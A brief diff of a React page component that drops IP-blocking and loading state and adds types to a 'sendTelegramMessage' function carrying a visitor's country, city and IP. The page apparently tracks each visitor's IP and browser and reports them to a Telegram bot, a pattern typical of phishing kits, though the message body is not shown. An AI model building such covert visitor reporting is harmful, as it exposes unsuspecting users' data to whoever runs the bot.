@@ -9,8 +9,6 @@ import axios from "axios";
 import { getUserCountry } from "./userLocation";
 export default function Page() {
 
-  const [isIpblocked, setIsIpblocked] = useState(false);
-  const [isLoading, setIsLoading] = useState(true);
   const [country, setCountry] = useState("");
   const [ipAddress, setIpAddress] = useState("");
   const [browser, setBrowser] = useState<string | undefined>(undefined);
@@ -33,7 +31,7 @@ export default function Page() {
     console.log("getCurrentUrl: window not available, returning empty string");
     return "";
   };
-  const sendTelegramMessage = (userCountry: any) => {
+  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
     // console.log("User Country", userCountry);
 
     const messageData = {
